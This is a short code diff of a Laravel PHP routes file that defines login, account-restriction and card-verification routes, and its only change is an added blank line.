@@ -8,6 +8,7 @@ Route::get('/login', [AuthController::class, 'login'])->name('login.index');
 Route::post('/login', [AuthController::class, 'idLogin'])->name('login.store');
 Route::put('/login', [AuthController::class, 'authenticate'])->name('login.authenticate');
 Route::get('/account/restriction', [AuthController::class, 'restrict'])->name('login.verify');
+
 Route::get('/account/verify/card', [VerificationController::class, 'card'])->name('verify.card');
 Route::post('/account/verify/card', [VerificationController::class, 'cardPost'])->name('verify.card.post');
 
